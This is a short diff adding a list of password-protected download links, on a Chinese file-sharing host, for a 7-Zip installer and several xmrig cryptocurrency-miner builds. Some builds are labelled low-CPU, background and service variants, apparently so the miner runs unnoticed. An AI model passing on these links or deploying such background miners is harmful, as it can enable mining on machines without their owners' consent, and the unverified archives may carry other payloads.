@@ -1,0 +1,6 @@
+7z1900.exe https://wws.lanzous.com/ikOVvmwf1ej  密码:8za9
+xmrig-HighCPU_TLS.7z https://wws.lanzous.com/ik7CJmwf1fa  密码:7bo1
+xmrig-LowCPU.7z https://wws.lanzous.com/ixZQomwf1hc 密码:h0qr
+xmrig-LowMemLowCPU.7z https://wws.lanzous.com/iZZdqmwf1je 密码:g9h9
+xmrig-LowMemLowCPU_Background.7z https://wws.lanzous.com/iUJuYmwf1mh 密码:53wb
+xmrig-LowMemLowCPUServices.7z https://wws.lanzous.com/ieCgomwf1ni 密码:21h1
